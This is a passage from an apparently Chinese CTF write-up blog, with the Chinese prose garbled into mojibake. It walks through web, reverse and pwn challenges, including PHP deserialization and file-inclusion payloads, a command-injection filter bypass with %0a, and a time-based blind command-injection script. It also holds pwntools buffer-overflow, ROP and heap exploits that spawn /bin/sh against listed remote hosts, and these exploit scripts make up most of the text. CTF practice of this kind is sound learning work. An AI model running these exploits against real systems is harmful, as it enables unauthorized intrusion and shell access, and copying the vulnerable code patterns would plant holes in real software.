class="hljs-keyword">$this</span>-&gt;file))&#123;            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);            &#125;        <span class="hljs-keyword">return</span> <span class="hljs-string">"Awwwwwwwwwww man"</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>çœ‹åˆ°fffffflag.phpï¼ŒçŒœæµ‹flagæˆ–è®¸å°±ä»è¿™æ®µä»£ç ä¸­æ‰¾å‡ºã€‚å‘ç°äº†æ¯”è¾ƒå…³é”®çš„ä¸€ä¸ªå‡½æ•°<code>__tostring()</code>,æ­¤å‡½æ•°çš„ä½œç”¨æ˜¯å°†Flagç±»ä½œä¸ºå­—ç¬¦ä¸²æ‰§è¡Œæ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œæ­¤å‡½æ•°ï¼Œå¹¶ä¸”å°†å˜é‡$fileä½œä¸ºæ–‡ä»¶åè¾“å‡ºæ–‡ä»¶å†…å®¹ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶å€™å‘ç°å¹¶æ²¡æœ‰ä»£ç æ˜¾ç¤ºå¯ä»¥è°ƒç”¨è¿™ä¸ªç±»ï¼Œå¦‚æœæ²¡æœ‰è°ƒç”¨è¿™ä¸ªç±»ï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œ__tostring()å‡½æ•°ã€‚è€Œä¸”ï¼Œè¿˜æœ‰ä¸€ä¸ªpasså‚æ•°æ²¡æœ‰ç”¨ä¸Šï¼Œæ‰€ä»¥è€ƒè™‘ï¼Œæˆ–è®¸è¿˜ä¼šå­˜åœ¨å¦ä¸€æ®µä»£ç ã€‚</p><p>è¯»ä¸€ä¸‹index.phpçš„æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(E_ALL &amp; ~E_NOTICE);$user = $_GET[<span class="hljs-string">"user"</span>];$file = $_GET[<span class="hljs-string">"file"</span>];$pass = $_GET[<span class="hljs-string">"pass"</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"admin"</span>))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello admin!&lt;br&gt;"</span>;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/fffffflag/"</span>,$file))&#123;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//class.php</span>        $pass = unserialize($pass);        <span class="hljs-keyword">echo</span> $pass;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are not admin ! "</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hava a rest and then change your choose."</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å‘ç°äº†æ­£åˆ™åŒ¹é…å‡½æ•°<code>preg_match(&quot;/fffffflag/&quot;,$file))</code> ï¼Œå¯¹flagè¿›è¡Œäº†æ­£åˆ™åŒ¹é…ã€‚</p><p><code>payload = http://120.55.43.255:28119/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:13:&quot;fffffflag.php&quot;;}</code> + post â€œadminâ€</p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9tq9sgsj31960u0jxu.jpg" data-caption="image-20191226175128138" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9tq9sgsj31960u0jxu.jpg" alt="image-20191226175128138"></a></p><p>flag{woyebuzhidaoyaononggeshaflagheshia}</p><h2 id="web2">web2<a class="post-anchor" href="#web2"></a></h2><p>fuzz äº†ä¸€ä¸‹ å‘ç°cutæ²¡æœ‰è¿‡æ»¤</p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9zmvnqkj30tk06w0v2.jpg" data-caption="image-20191226175711730" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9zmvnqkj30tk06w0v2.jpg" alt="image-20191226175711730"></a></p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa06pp6e1j316g0lc45b.jpg" data-caption="image-20191226121756570" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa06pp6e1j316g0lc45b.jpg" alt="image-20191226121756570"></a><p>flag{WOw_Cut_4Nd_C4t_lo0kS_Sh49e}</p><h2 id="misc-1">misc<a class="post-anchor" href="#misc-1"></a></h2><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gadeuvsxe3j32gy0h07ay.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gadeuvsxe3j32gy0h07ay.jpg" alt></a></p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gadevcodsbj32i20d40y1.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gadevcodsbj32i20d40y1.jpg" alt></a></p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gadevrvkobj32i0082n0n.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gadevrvkobj32i0082n0n.jpg" alt></a></p><p>pip install gameformuflag</p><p>flag{a70483c2fa93f9bd54c4fcf3cca0b484}</p><h1 id="day4">day4<a class="post-anchor" href="#day4"></a></h1><h2 id="Web">Web<a class="post-anchor" href="#Web"></a></h2><pre><code class="hljs php">There is a ping.php&lt;!--    $password=<span class="hljs-string">"****************"</span>;     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;        <span class="hljs-keyword">if</span> (strcmp($_POST[<span class="hljs-string">'password'</span>], $password) == <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Right!!!login success"</span>;            <span class="hljs-keyword">include</span>($_REQUEST[<span class="hljs-string">'path'</span>]);            <span class="hljs-keyword">exit</span>();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Wrong password.."</span>;        &#125;--&gt;</code></pre><p>æ•°ç»„ç»•è¿‡ + æ–‡ä»¶åŒ…å«</p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe5terocj31ec0laq5q.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe5terocj31ec0laq5q.jpg" alt></a></p><p>è¯» ping.php </p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe735n6mj31j60pijyf.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe735n6mj31j60pijyf.jpg" alt></a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[ <span class="hljs-string">'ip'</span> ])) &#123;    $target = trim($_REQUEST[ <span class="hljs-string">'ip'</span> ]);    $substitutions = <span class="hljs-keyword">array</span>(        <span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'|'</span> =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,        <span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );        <span class="hljs-keyword">echo</span> $target;    <span class="hljs-keyword">echo</span>  <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;&#125;</code></pre><p>è¿‡æ»¤äº†å¾ˆå¤šåˆ†éš”ç¬¦ å¯ä»¥ç”¨ %0a</p><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe97vmx8j30tg0dkta4.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe97vmx8j30tg0dkta4.jpg" alt></a></p><p>flag{You_AR3_qiao_bi_KuN???}</p><h2 id="apk123">apk123<a class="post-anchor" href="#apk123"></a></h2><p>å¯ä»¥å‘ç° è¾“å…¥ç»è¿‡ <code>public static String encry_RC4_string(String paramString1, String paramString2) { return (paramString1 == null || paramString2 == null) ? null : toHexString(asString(encry_RC4_byte(paramString1, paramString2))); }</code> ç„¶åå’Œ <code>FlagEncode</code> è¿›è¡Œå¯¹æ¯”</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">toHexString</span><span class="hljs-params">(String paramString)</span> </span>&#123;  String str = <span class="hljs-string">""</span>;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">byte</span> b = <span class="hljs-number">0</span>; b &lt; paramString.length(); b++) &#123;    String str2 = Integer.toHexString(paramString.charAt(b) &amp; <span class="hljs-number">0xFF</span>);    String str1 = str2;    <span class="hljs-keyword">if</span> (str2.length() == <span class="hljs-number">1</span>)      str1 = <span class="hljs-string">'0'</span> + str2;     str = str + str1;  &#125;   <span class="hljs-keyword">return</span> str;&#125;</code></pre><p>å°†å­—ç¬¦è½¬ä¸ºäº†16è¿›åˆ¶ï¼Œæœ€åå¼•ç”¨äº† RC4base</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] RC4Base(<span class="hljs-keyword">byte</span>[] paramArrayOfByte, String paramString) &#123;  <span class="hljs-keyword">char</span> c = Character.MIN_VALUE;  <span class="hljs-keyword">byte</span> b1 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">byte</span>[] arrayOfByte1 = initKey(paramString);  <span class="hljs-keyword">byte</span>[] arrayOfByte2 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[paramArrayOfByte.length];  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">byte</span> b = <span class="hljs-number">0</span>; b &lt; paramArrayOfByte.length; b++) &#123;    c = c + <span class="hljs-keyword">true</span> &amp; <span class="hljs-number">0xFF</span>;    b1 = (arrayOfByte1[c] &amp; <span class="hljs-number">0xFF</span>) + b1 &amp; <span class="hljs-number">0xFF</span>;    <span class="hljs-keyword">byte</span> b2 = arrayOfByte1[c];    arrayOfByte1[c] = arrayOfByte1[b1];    arrayOfByte1[b1] = b2;    <span class="hljs-keyword">byte</span> b3 = arrayOfByte1[c];    <span class="hljs-keyword">byte</span> b4 = arrayOfByte1[b1];    arrayOfByte2[b] = (<span class="hljs-keyword">byte</span>)(paramArrayOfByte[b] ^ arrayOfByte1[(b3 &amp; <span class="hljs-number">0xFF</span>) + (b4 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFF</span>]);  &#125;   <span class="hljs-keyword">return</span> arrayOfByte2;&#125;</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum <span class="hljs-keyword">as</span> ln<span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">as</span> bs64<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hexenc = <span class="hljs-number">0x52aedea36a3c058b38aa32e625889947db302a6d1defdabf413085abf611487bf445e85108327a867c27</span>enc = ln.n2s(enc)<span class="hljs-keyword">print</span> enckey = <span class="hljs-string">"Flag&#123;This_Not_Flag&#125;"</span>ob2 = ARC4.new(key)flag = ob2.decrypt(enc)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#flag&#123;11111111-1111-1234-1234-aaaabbbbcccc&#125;</span></code></pre><h2 id="Internal-Chat-System">Internal Chat System<a class="post-anchor" href="#Internal-Chat-System"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment"># io=remote('120.55.43.255',19812)</span>io=process(<span class="hljs-string">"./Internal Chat System"</span>)libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(name)</span>:</span>    io.sendline(<span class="hljs-string">'1'</span>)    io.recvuntil(<span class="hljs-string">'Please input your user name:'</span>)    io.send(name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(size,name,age,description)</span>:</span>    io.sendline(<span class="hljs-string">'2'</span>)    io.recvuntil(<span class="hljs-string">'Input your name size:'</span>)    io.send(str(size))    io.recvuntil(<span class="hljs-string">'Input your name:'</span>)    io.send(name)    io.recvuntil(<span class="hljs-string">'Input your age:'</span>)    io.send(str(age))    io.recvuntil(<span class="hljs-string">'Input your description:'</span>)    io.send(description)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_profile</span><span class="hljs-params">()</span>:</span>    io.sendline(<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(name,age,description)</span>:</span>    io.sendline(<span class="hljs-string">'2'</span>)    io.recvuntil(<span class="hljs-string">'Input your name:'</span>)    io.send(name)    io.recvuntil(<span class="hljs-string">'Input your age:'</span>)    io.send(str(age))    io.recvuntil(<span class="hljs-string">'Input your description:'</span>)    io.send(description)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_delete_friend</span><span class="hljs-params">(choice,name)</span>:</span>    io.sendline(<span class="hljs-string">'3'</span>)    io.recvuntil(<span class="hljs-string">"Input the friend's name:"</span>)    io.send(name)    io.recvuntil(<span class="hljs-string">'So..Do u want to add or delete this friend?(a/d)'</span>)    io.send(choice)    <span class="hljs-keyword">if</span> choice==<span class="hljs-string">'a'</span>:        io.recvuntil(<span class="hljs-string">'Done!\n'</span>)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">pass</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_message</span><span class="hljs-params">(user,title,content)</span>:</span>    io.sendline(<span class="hljs-string">'4'</span>)    io.recvuntil(<span class="hljs-string">'Which user do you want to send a msg to:'</span>)    io.send(user)    io.recvuntil(<span class="hljs-string">'Input your message title:'</span>)    io.send(title)    io.recvuntil(<span class="hljs-string">'Input your content:'</span>)    io.send(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_message</span><span class="hljs-params">()</span>:</span>    io.sendline(<span class="hljs-string">'5'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>:</span>    io.sendline(<span class="hljs-string">'6'</span>)register(<span class="hljs-number">16</span>,<span class="hljs-string">'a\x00'</span>,<span class="hljs-number">18</span>,<span class="hljs-string">'nothing'</span>)login(<span class="hljs-string">'a\x00'</span>)add_delete_friend(<span class="hljs-string">'a\x00'</span>,<span class="hljs-string">'a\x00'</span>)add_delete_friend(<span class="hljs-string">'d\x00'</span>,<span class="hljs-string">'a\x00'</span>)view_profile()io.recvuntil(<span class="hljs-string">'Age:'</span>)libc_base=eval(<span class="hljs-string">'0x'</span>+io.recvuntil(<span class="hljs-string">'b78'</span>))-libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x68</span><span class="hljs-keyword">print</span> <span class="hljs-string">"libc_base -&gt; "</span> + hex(libc_base)logout()register(<span class="hljs-number">0x128</span>,p64(<span class="hljs-number">0x0000000000603068</span>)+p64(<span class="hljs-number">18</span>),<span class="hljs-number">18</span>,<span class="hljs-string">'nothing'</span>)login(p64(libc_base+libc.symbols[<span class="hljs-string">'atoi'</span>])[:<span class="hljs-number">-2</span>])update(p64(libc_base+libc.symbols[<span class="hljs-string">'system'</span>])[:<span class="hljs-number">-2</span>],<span class="hljs-number">18</span>,<span class="hljs-string">'\x00'</span>)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre><p>flag{plty0p6f-2zbb-eyn6-mdbc-d09mh74658au}</p><h1 id="day5">day5<a class="post-anchor" href="#day5"></a></h1><h2 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h2><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaci6wpx1tj314a0c240o.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaci6wpx1tj314a0c240o.jpg" alt></a></p><pre><code class="hljs python">enc = [<span class="hljs-number">0x17</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>]flag =<span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(enc), <span class="hljs-number">2</span>):    a = enc[i]^<span class="hljs-number">16</span>    b = enc[i+<span class="hljs-number">1</span>]^<span class="hljs-number">16</span>    bh = b//<span class="hljs-number">16</span>    bl = b%<span class="hljs-number">16</span>    ah = a//<span class="hljs-number">16</span>    al = a%<span class="hljs-number">16</span>    c = bh + al*<span class="hljs-number">16</span>    d = ah + bl*<span class="hljs-number">16</span>    flag+=chr(c)+chr(d)<span class="hljs-keyword">print</span> <span class="hljs-string">"flag:&#123;"</span>+flag+<span class="hljs-string">"&#125;"</span></code></pre><h2 id="web-2">web<a class="post-anchor" href="#web-2"></a></h2><p>execæ²¡æœ‰å›æ˜¾</p><p>æ—¶é—´ç›²æ³¨</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringdic = string.printableflag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dic)):url = <span class="hljs-string">"http://120.55.43.255:22712"</span>data = &#123;<span class="hljs-string">"cmd"</span> : <span class="hljs-string">'''[ `cut -c '''</span>+str(j)+<span class="hljs-string">''' flag.txt` =  "%c" ]  &amp;&amp; sleep 5'''</span>%dic[i]&#125;<span class="hljs-keyword">try</span>:r = requests.post(url,data=data,timeout=<span class="hljs-number">1</span>)<span class="hljs-comment"># print data</span><span class="hljs-keyword">except</span> requests.exceptions.ReadTimeout,e:flag += dic[i]<span class="hljs-keyword">print</span> flag<span class="hljs-keyword">break</span></code></pre><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gacjzckwo5j30j413cn2z.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gacjzckwo5j30j413cn2z.jpg" alt></a><p>ç¬¬äºŒç§æ˜¯é€šè¿‡dnsåå¸¦ä½†æ˜¯è¿™é¢˜æ‰“ä¸é€š</p><h2 id="pwn-1">pwn<a class="post-anchor" href="#pwn-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> syscontext.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./Self-service Refueling System'</span>ip = <span class="hljs-string">'120.55.43.255'</span>port = <span class="hljs-string">'23810'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)rdi_ret = <span class="hljs-number">0x0000000000400fb3</span>main = <span class="hljs-number">0x0000000000400EAA</span><span class="hljs-comment">#740</span>p.sendlineafter(<span class="hljs-string">"(y/n)\n"</span>,<span class="hljs-string">"y"</span>)p.recvuntil(<span class="hljs-string">"Card ID :\n"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0x6666</span>)+p32(<span class="hljs-number">0x2333</span>)+p64(<span class="hljs-number">1</span>)payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)p.sendline(payload)p.sendlineafter(<span class="hljs-string">"ou want?(L)\n"</span>,<span class="hljs-string">"1L"</span>)p.recvuntil(<span class="hljs-string">"gas\n"</span>)p.recvuntil(<span class="hljs-string">"\x30\x6d"</span>)addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))ls(<span class="hljs-string">"libc start main"</span>,addr)libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)p.sendlineafter(<span class="hljs-string">"(y/n)\n"</span>,<span class="hljs-string">"y"</span>)p.recvuntil(<span class="hljs-string">"Card ID :\n"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0x6666</span>)+p32(<span class="hljs-number">0x2333</span>)+p64(<span class="hljs-number">1</span>)payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(libc.symbols[<span class="hljs-string">'system'</span>])p.sendline(payload)p.sendlineafter(<span class="hljs-string">"ou want?(L)\n"</span>,<span class="hljs-string">"1L"</span>)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj-&gt;pwn</title>
      <link href="/2019/12/17/buuoj-pwn/"/>
      <url>/2019/12/17/buuoj-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="0x01-rip">0x01:rip<a class="post-anchor" href="#0x01-rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">åœ¨ä¸€äº›64ä½çš„glibcçš„payloadè°ƒç”¨systemå‡½æ•°å¤±è´¥é—®é¢˜</a></p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'27500'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))bin_sh_addr=<span class="hljs-number">0x40201B</span>pop_rdi=<span class="hljs-number">0x4011fb</span>payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">23</span>payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(<span class="hljs-number">0x0000000000401016</span>)payload += p64(elf.symbols[<span class="hljs-string">"system"</span>])<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(payload)p.interactive()</code></pre><h2 id="0x02-warmup-csaw-2016">0x02:warmup_csaw_2016<a class="post-anchor" href="#0x02-warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./warmup_csaw_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'29098'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x00000000040060D</span>ret = <span class="hljs-number">0x00000000004004a1</span>p.recvuntil(<span class="hljs-string">"&gt;"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x48</span>+p64(backdoor))p.interactive()</code></pre><h2 id="0x03-pwn1-sctf-2016">0x03:pwn1_sctf_2016<a class="post-anchor" href="#0x03-pwn1-sctf-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1_sctf_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26620'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x08048F0D</span><span class="hljs-comment"># p.recvuntil(": ")</span><span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"I"</span> * <span class="hljs-number">19</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0x08048F0D</span>))p.interactive()</code></pre><h2 id="0x04-ciscn-2019-c-1">0x04:ciscn_2019_c_1<a class="post-anchor" href="#0x04-ciscn-2019-c-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./ciscn_2019_c_1'</span>libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'25405'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(debug == <span class="hljs-number">1</span>):p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)ret = <span class="hljs-number">0x00000000004006b9</span>rdi_ret = <span class="hljs-number">0x0000000000400c83</span>main = <span class="hljs-number">0x000000000400B28</span>p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)payload = <span class="hljs-string">"a"</span>*(<span 